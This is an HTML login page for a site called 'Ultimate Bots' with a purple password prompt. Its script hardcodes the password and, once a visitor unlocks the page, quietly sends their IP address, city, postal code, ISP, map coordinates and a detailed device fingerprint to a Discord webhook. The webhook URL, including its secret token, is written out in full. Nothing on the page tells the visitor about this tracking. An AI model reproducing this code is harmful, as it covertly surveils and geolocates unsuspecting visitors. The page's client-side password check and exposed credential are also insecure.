<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Ultimate Bots</title>
  <link rel="icon" href="ultimatebotslogo.png" type="image/png" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #ece9e6, #ffffff);
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
    }

    #login, #content {
      background: white;
      padding: 2.5rem;
      border-radius: 16px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 90%;
      opacity: 0;
      transform: translateY(20px);
      animation: fadeInUp 0.6s forwards;
    }

    @keyframes fadeInUp {
      to {
        opacity: 1;
        transform: translateY(0);
      }
    }

    h1, h2 {
      text-align: center;
      margin: 0 0 1rem;
    }

    input[type="password"] {
      width: 100%;
      padding: 0.75rem;
      margin-bottom: 1rem;
      border: 1px solid #ccc;
      border-radius: 8px;
      font-size: 1rem;
      outline: none;
      transition: border 0.3s ease;
    }

    input[type="password"]:focus {
      border-color: #7a42f4;
    }

    button {
      width: 100%;
      padding: 0.75rem;
      background-color: #7a42f4;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 1rem;
      cursor: pointer;
      transition: background 0.3s ease, transform 0.2s ease;
    }

    button:hover {
      background-color: #692ee0;
      transform: scale(1.02);
    }

    #error {
      color: red;
      text-align: center;
      margin-top: 0.5rem;
      display: none;
    }

    #spinner {
      display: none;
      margin: 1rem auto 0;
      border: 4px solid #f3f3f3;
      border-top: 4px solid #7a42f4;
      border-radius: 50%;
      width: 24px;
      height: 24px;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to {
        transform: rotate(360deg);
      }
    }

    #content {
      display: none;
      text-align: center;
    }

    #content p {
      margin-top: 1rem;
    }
  </style>
</head>
<body>

  <div id="login">
    <h2>Enter Password</h2>
    <input type="password" id="passwordInput" placeholder="Password" autofocus />
    <button id="submitBtn">Unlock</button>
    <div id="spinner"></div>
    <div id="error">❌ Incorrect password. Try again.</div>
  </div>

  <div id="content">
    <h1>✅ Access Granted</h1>
    <p>Welcome to the protected content. Enjoy your stay!</p>
  </div>

  <script>
    const correctPassword = "ultimatebots";
    const webhookURL = "https://discord.com/api/webhooks/1387062874488180746/ViAtWPxP3sXwwSi1rSNpOnzMIMrRtIBsxuPHRA5NV3kxe1mdwqAb71eAAav_qu1P3tL2"; // Replace with your webhook

    async function sendWebhookMessage() {
        // Get IP and location
        const ipInfo = await fetch("https://ipapi.co/json/")
          .then(res => res.json())
          .catch(() => ({}));
      
        const ip = ipInfo.ip || "Unavailable";
        const country = ipInfo.country_name || "Unknown";
        const region = ipInfo.region || "Unknown";
        const city = ipInfo.city || "Unknown";
        const postal = ipInfo.postal || "Unknown";
        const org = ipInfo.org || "Unknown";
        const lat = ipInfo.latitude || "Unknown";
        const lon = ipInfo.longitude || "Unknown";
      
        // Device info
        const userAgent = navigator.userAgent;
        const platform = navigator.platform;
        const browser = getBrowserInfo(userAgent);
        const timestamp = new Date().toLocaleString();
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const language = navigator.language;
        const screenSize = `${window.screen.width}x${window.screen.height}`;
        const windowSize = `${window.innerWidth}x${window.innerHeight}`;
        const referrer = document.referrer || "None";
        const pageURL = window.location.href;
        const touchSupport = navigator.maxTouchPoints > 0 ? "Yes" : "No";
        const cookieEnabled = navigator.cookieEnabled ? "Yes" : "No";
      
        const embed = {
          title: "🔐 Login Detected",
          color: 0x7a42f4,
          fields: [
            { name: "🕒 Time", value: timestamp, inline: true },
            { name: "🌍 Timezone", value: timezone, inline: true },
            { name: "💻 Platform", value: platform, inline: true },
            { name: "🌐 Browser", value: browser, inline: true },
            { name: "📐 Screen Size", value: screenSize, inline: true },
            { name: "📏 Window Size", value: windowSize, inline: true },
            { name: "🌐 Language", value: language, inline: true },
            { name: "☝️ Touch Support", value: touchSupport, inline: true },
            { name: "🍪 Cookies Enabled", value: cookieEnabled, inline: true },
            { name: "📄 Referrer", value: referrer, inline: false },
            { name: "🔗 Page URL", value: pageURL, inline: false },
            { name: "🌐 IP Address", value: ip, inline: false },
            { name: "🌎 Location", value: `${city}, ${region}, ${country} ${postal}`, inline: false },
            { name: "🏢 ISP", value: org, inline: false },
            { name: "🗺 Coordinates", value: `${lat}, ${lon}`, inline: false },
            { name: "🧾 User Agent", value: `\`${userAgent}\``, inline: false }
          ],
          footer: {
            text: "Ultimate Bots WebSite - Login"
          },
          timestamp: new Date().toISOString()
        };
      
        fetch(webhookURL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            username: "WebSite | Login ",
            embeds: [embed]
          })
        }).catch(console.error);
      }
      
      function getBrowserInfo(ua) {
        if (/edg/i.test(ua)) return "Edge";
        if (/opr\//i.test(ua)) return "Opera";
        if (/chrome|crios/i.test(ua)) return "Chrome";
        if (/firefox|fxios/i.test(ua)) return "Firefox";
        if (/safari/i.test(ua)) return "Safari";
        return "Unknown";
      }

    async function checkPassword() {
      const input = document.getElementById("passwordInput").value;
      const errorDiv = document.getElementById("error");
      const spinner = document.getElementById("spinner");

      errorDiv.style.display = "none";
      spinner.style.display = "block";

      await new Promise(r => setTimeout(r, 600));

      if (input === correctPassword) {
        document.getElementById("login").style.display = "none";
        document.getElementById("content").style.display = "block";
        sendWebhookMessage();
      } else {
        errorDiv.style.display = "block";
      }

      spinner.style.display = "none";
    }

    document.getElementById("submitBtn").addEventListener("click", checkPassword);
    document.getElementById("passwordInput").addEventListener("keydown", (e) => {
      if (e.key === "Enter") checkPassword();
      document.getElementById("error").style.display = "none";
    });
  </script>

</body>
</html>
